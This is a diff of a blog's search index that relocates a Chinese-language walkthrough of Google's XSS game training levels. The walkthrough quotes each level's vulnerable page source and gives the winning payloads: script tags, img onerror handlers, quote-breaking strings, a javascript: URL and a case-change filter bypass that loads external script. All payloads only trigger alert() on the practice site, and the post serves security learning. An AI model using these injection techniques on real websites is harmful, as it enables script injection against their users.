@@ -98,6 +98,93 @@
       </tags>
   </entry>
   <entry>
+    <title>Google XSS game</title>
+    <url>/2021/03/10/Google%20XSS%20game/</url>
+    <content><![CDATA[<h2 id="Google-XSS-game"><a href="#Google-XSS-game" class="headerlink" title="Google XSS game"></a>Google XSS game</h2><p>这是谷歌的XSS靶场，每一关的过关条件是能够弹出<code>alert()</code>即可。</p>
+<p>地址：<a class="link"   href="https://xss-game.appspot.com/" >https://xss-game.appspot.com/<i class="fas fa-external-link-alt"></i></a>  (需要科学上网)</p>
+<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308224534084.png" alt="image-20210308224534084"></p>
+<p>这是一个反射型XSS，直接输入最基本的XSS代码即可：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308224729370.png" alt="image-20210308224729370"></p>
+<p>留言板应用，显然是一个存储型XSS，尝试<code>&lt;script&gt;</code>标签无果，尝试使用<code>&lt;img&gt;</code>标签：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309093515031.png" alt="image-20210309093515031"></p>
+<p>这是一个页面嵌套，没有可见的可以利用的点，只能从源码入手</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">chooseTab</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Dynamically load the appropriate image.</span></span><br><span class="line">        <span class="keyword">var</span> html = <span class="string">&quot;Image &quot;</span> + <span class="built_in">parseInt</span>(num) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        html += <span class="string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line">        $(<span class="string">&#x27;#tabContent&#x27;</span>).html(html);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">window</span>.location.hash = num;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Select the current tab</span></span><br><span class="line">        <span class="keyword">var</span> tabs = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;.tab&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tabs.length; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (tabs[i].id == <span class="string">&quot;tab&quot;</span> + <span class="built_in">parseInt</span>(num)) &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab active&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Tell parent we&#x27;ve changed the tab</span></span><br><span class="line">        top.postMessage(self.location.toString(), <span class="string">&quot;*&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)) || <span class="string">&quot;1&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// Extra code so that we can communicate with the parent page</span></span><br><span class="line">      <span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (event.source == parent) &#123;</span><br><span class="line">          chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, <span class="literal">false</span>);</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>函数解释</li>
+</ul>
+<p>parseInt()：parseInt() 函数可解析一个字符串，并返回一个整数。</p>
+<p>unescape()：对通过 escape() 编码的字符串进行解码。</p>
+<p>querySelectorAll()：返回文档中匹配指定 CSS 选择器的所有元素，返回 <a class="link"   href="https://www.runoob.com/js/js-htmldom-nodelist.html" >NodeList<i class="fas fa-external-link-alt"></i></a> 对象。NodeList 对象表示节点的集合。可以通过索引访问，索引值从 0 开始。</p>
+<p>location.hash ：hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。也就是说，他的作用是把URL的<code>#</code>以及<code>#</code>后面的数据取出来，</p>
+<p>window.onload()：方法用于在网页加载完毕后立刻执行的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。</p>
+<p><em>element</em>.addEventListener(<em>event, function, useCapture</em>)：方法用于向指定元素添加事件句柄。第一个参数是事件的类型 (如 “click” 或 “mousedown”)。第二个参数是事件触发后调用的函数。第三个参数是个布尔值用于描述事件是冒泡还是捕获。该参数是可选的。</p>
+<p>html()：方法设置或返回被选元素的内容（innerHTML）。当该方法用于返回内容时，则返回第一个匹配元素的内容。当该方法用于设置内容时，则重写所有匹配元素的内容。</p>
+<ul>
+<li>利用方法</li>
+</ul>
+<p>我们知道页面会调用chooseTab函数，将url中#后面的字符串做为参数传入。我们需要构造一个字符串，使img标签加载的时候执行我们的代码。这里我们可以把 src 截断，这样他的图片肯定会报错，然后添加一个 onerror 事件执行alert()，最后还要把 img 标签后面的 <code>&gt;</code>补齐</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; onerror&#x3D;alert()&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p><img src="C:%5CUsers%5CJohn%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210309102640296.png" alt="image-20210309102640296"></p>
+<ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/game-frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/game-frame-styles.css&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">startTimer</span>(<span class="params">seconds</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        seconds = <span class="built_in">parseInt</span>(seconds) || <span class="number">3</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">          <span class="built_in">window</span>.confirm(<span class="string">&quot;Time is up!&quot;</span>);</span></span><br><span class="line"><span class="javascript">          <span class="built_in">window</span>.history.back();</span></span><br><span class="line">        &#125;, seconds * 1000);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level4&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level4.png&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/loading.gif&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;startTimer(&#x27;&#123;&#123; timer &#125;&#125;&#x27;);&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;message&quot;</span>&gt;</span>Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当我们在 index.html 页面输入时间后，就会把<code>timer</code>参数传递到 timer.html 页面中，在onload时间时就会触发<strong>startTimer</strong>函数，我们可以从这个onload事件进行利用，把前一句话闭合，加上自己构造的语句，最后还要把后面的给注释掉，这就是dom xss的利用方法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;);alert();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309104838145.png" alt="image-20210309104838145"></p>
+<p>这里有3个页面，分别是welcome，注册和确定</p>
+<ul>
+<li><p>查看源码</p>
+<ul>
+<li>welcome.html</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/game-frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/game-frame-styles.css&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level5&quot;</span>&gt;</span></span><br><span class="line">    Welcome! Today we are announcing the much anticipated<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level5.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/level5/frame/signup?next=confirm&quot;</span>&gt;</span>Sign up<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">    for an exclusive Beta.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里可以看到，下面的a标签的链接带了一个<code>next</code>参数到signup页面</p>
+<ul>
+<li>signup.html</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/game-frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/game-frame-styles.css&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level5&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level5.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- We&#x27;re ignoring the email, but the poor user will never know! --&gt;</span></span><br><span class="line">    Enter email: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;reader-email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; next &#125;&#125;&quot;</span>&gt;</span>Next &gt;&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在signup页面把welcome页面传过来的<code>next</code>参数直接解析放到了下面的a标签的链接中</p>
+</li>
+<li><p>利用方法</p>
+</li>
+</ul>
+<p>我们可以直接在<code>next</code>参数中构造攻击语句，当用户点击a标签的时候该语句就能被执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level5&#x2F;frame&#x2F;signup?next&#x3D;javascript:alert()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309105632106.png" alt="image-20210309105632106"></p>
+<ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/game-frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/game-frame-styles.css&quot;</span> /&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">setInnerText</span>(<span class="params">element, value</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (element.innerText) &#123;</span></span><br><span class="line">        element.innerText = value;</span><br><span class="line"><span class="javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line">        element.textContent = value;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">includeGadget</span>(<span class="params">url</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> scriptEl = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"> </span><br><span class="line"><span class="javascript">      <span class="comment">// This will totally prevent us from loading evil URLs!</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (url.match(<span class="regexp">/^https?:\/\//</span>)) &#123;</span></span><br><span class="line"><span class="javascript">        setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),</span></span><br><span class="line"><span class="javascript">          <span class="string">&quot;Sorry, cannot load a URL containing \&quot;http\&quot;.&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">      <span class="comment">// Load this awesome gadget</span></span></span><br><span class="line">      scriptEl.src = url;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">      <span class="comment">// Show log messages</span></span></span><br><span class="line"><span class="javascript">      scriptEl.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">        setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),  </span></span><br><span class="line"><span class="javascript">          <span class="string">&quot;Loaded gadget from &quot;</span> + url);</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      scriptEl.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">        setInnerText(<span class="built_in">document</span>.getElementById(<span class="string">&quot;log&quot;</span>),  </span></span><br><span class="line"><span class="javascript">          <span class="string">&quot;Couldn&#x27;t load gadget from &quot;</span> + url);</span></span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.head.appendChild(scriptEl);</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="javascript">    <span class="comment">// Take the value after # and use it as the gadget filename.</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">getGadgetName</span>(<span class="params"></span>) </span>&#123; </span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>) || <span class="string">&quot;/static/gadget.js&quot;</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    includeGadget(getGadgetName());</span><br><span class="line"> </span><br><span class="line"><span class="javascript">    <span class="comment">// Extra code so that we can communicate with the parent page</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (event.source == parent) &#123;</span></span><br><span class="line">        includeGadget(getGadgetName());</span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">id</span>=<span class="string">&quot;level6&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/logos/level6.png&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;cube&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/static/level6_cube.png&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;log&quot;</span>&gt;</span>Loading gadget...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>题目说得很清楚，利用外部js脚本执行alert()。但是对参数做了过滤，不能输入带有<code>http://</code>开头的参数，这里可以利用大小绕过：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Https:&#x2F;&#x2F;www.google.com&#x2F;jsapi?callback&#x3D;alert</span><br></pre></td></tr></table></figure>
+<p>也可以利用data类型的url代替<code>http://</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:text,alert()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://rock718.github.io/2017/08/14/xss-game-writeup/" >google xss-game 题目解答<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.freebuf.com/articles/web/36072.html" >玩转Google的XSS游戏<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Google XSS game(2017)</title>
     <url>/2021/03/10/Google%20XSS%20game(2017)/</url>
     <content><![CDATA[<h1 id="Google-XSS-game-2017"><a href="#Google-XSS-game-2017" class="headerlink" title="Google XSS game(2017)"></a>Google XSS game(2017)</h1><p>这是新版的谷歌XSS靶场，每一关的过关条件是能够弹出alert()即可。</p>
@@ -267,93 +354,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Google XSS game</title>
-    <url>/2021/03/10/Google%20XSS%20game/</url>
-    <content><![CDATA[<h2 id="Google-XSS-game"><a href="#Google-XSS-game" class="headerlink" title="Google XSS game"></a>Google XSS game</h2><p>这是谷歌的XSS靶场，每一关的过关条件是能够弹出<code>alert()</code>即可。</p>
-<p>地址：<a class="link"   href="https://xss-game.appspot.com/" >https://xss-game.appspot.com/<i class="fas fa-external-link-alt"></i></a>  (需要科学上网)</p>
-<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308224534084.png" alt="image-20210308224534084"></p>
-<p>这是一个反射型XSS，直接输入最基本的XSS代码即可：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308224729370.png" alt="image-20210308224729370"></p>
-<p>留言板应用，显然是一个存储型XSS，尝试<code>&lt;script&gt;</code>标签无果，尝试使用<code>&lt;img&gt;</code>标签：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309093515031.png" alt="image-20210309093515031"></p>
-<p>这是一个页面嵌套，没有可见的可以利用的点，只能从源码入手</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">chooseTab</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Dynamically load the appropriate image.</span></span><br><span class="line">        <span class="keyword">var</span> html = <span class="string">&quot;Image &quot;</span> + <span class="built_in">parseInt</span>(num) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        html += <span class="string">&quot;&lt;img src=&#x27;/static/level3/cloud&quot;</span> + num + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line">        $(<span class="string">&#x27;#tabContent&#x27;</span>).html(html);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">window</span>.location.hash = num;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Select the current tab</span></span><br><span class="line">        <span class="keyword">var</span> tabs = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;.tab&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tabs.length; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (tabs[i].id == <span class="string">&quot;tab&quot;</span> + <span class="built_in">parseInt</span>(num)) &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab active&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Tell parent we&#x27;ve changed the tab</span></span><br><span class="line">        top.postMessage(self.location.toString(), <span class="string">&quot;*&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)) || <span class="string">&quot;1&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// Extra code so that we can communicate with the parent page</span></span><br><span class="line">      <span class="built_in">window</span>.addEventListener(<span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (event.source == parent) &#123;</span><br><span class="line">          chooseTab(<span class="built_in">unescape</span>(self.location.hash.substr(<span class="number">1</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, <span class="literal">false</span>);</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>函数解释</li>
-</ul>
-<p>parseInt()：parseInt() 函数可解析一个字符串，并返回一个整数。</p>
-<p>unescape()：对通过 escape() 编码的字符串进行解码。</p>
-<p>querySelectorAll()：返回文档中匹配指定 CSS 选择器的所有元素，返回 <a class="link"   href="https://www.runoob.com/js/js-htmldom-nodelist.html" >NodeList<i class="fas fa-external-link-alt"></i></a> 对象。NodeList 对象表示节点的集合。可以通过索引访问，索引值从 0 开始。</p>
-<p>location.hash ：hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。也就是说，他的作用是把URL的<code>#</code>以及<code>#</code>后面的数据取出来，</p>
-<p>window.onload()：方法用于在网页加载完毕后立刻执行的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。</p>
-<p><em>element</em>.addEventListener(<em>event, function, useCapture</em>)：方法用于向指定元素添加事件句柄。第一个参数是事件的类型 (如 “click” 或 “mousedown”)。第二个参数是事件触发后调用的函数。第三个参数是个布尔值用于描述事件是冒泡还是捕获。该参数是可选的。</p>
-<p>html()：方法设置或返回被选元素的内容（innerHTML）。当该方法用于返回内容时，则返回第一个匹配元素的内容。当该方法用于设置内容时，则重写所有匹配元素的内容。</p>
-<ul>
-<li>利用方法</li>
-</ul>
-<p>我们知道页面会调用chooseTab函数，将url中#后面的字符串做为参数传入。我们需要构造一个字符串，使img标签加载的时候执行我们的代码。这里我们可以把 src 截断，这样他的图片肯定会报错，然后添加一个 onerror 事件执行alert()，最后还要把 img 标签后面的 <code>&gt;</code>补齐</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; onerror&#x3D;alert()&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p><img src="C:%5CUsers%5CJohn%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210309102640296.png" alt="image-20210309102640296"></p>
-<ul>
-<li>查看源码</li>
-</ul>
